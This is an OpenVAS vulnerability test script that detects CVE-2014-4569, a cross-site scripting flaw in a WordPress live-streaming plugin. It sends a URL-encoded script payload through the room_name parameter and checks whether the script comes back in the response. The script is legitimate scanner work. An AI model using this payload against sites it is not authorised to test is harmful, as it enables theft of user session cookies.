###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_videowhisper_live_streaming_xss_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# WordPress VideoWhisper Live Streaming Integration Plugin XSS Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804804");
  script_version("$Revision: 11402 $");
  script_cve_id("CVE-2014-4569");
  script_bugtraq_id(68321);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-08-11 11:00:09 +0530 (Mon, 11 Aug 2014)");
  script_name("WordPress VideoWhisper Live Streaming Integration Plugin XSS Vulnerability");


  script_tag(name:"summary", value:"This host is installed with WordPress VideoWhisper Live Streaming Integration
Plugin and is prone to cross-site scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Input passed via the 'room_name' GET parameter to ls/vv_login.php script is not
properly sanitised before returning to the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary script
code in a user's browser session within the trust relationship between their
browser and the server.");
  script_tag(name:"affected", value:"WordPress VideoWhisper Live Streaming Integration Plugin version 4.27.2 and
prior.");
  script_tag(name:"solution", value:"Upgrade to version 4.27.3 or later. For updates refer
http://wordpress.org/plugins/videowhisper-live-streaming-integration");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/94207");
  script_xref(name:"URL", value:"http://codevigilant.com/disclosure/wp-plugin-videowhisper-live-streaming-integration-a3-cross-site-scripting-xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/wp-content/plugins/videowhisper-live-streaming-integration/ls" +
            "/vv_login.php?room_name=%27%3E%3Cscript%3Ealert(document.cooki" +
            "e)%3C%2Fscript%3E";

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>",
   extra_check:"tokenKey=VideoWhisper"))
{
  security_message(http_port);
  exit(0);
}
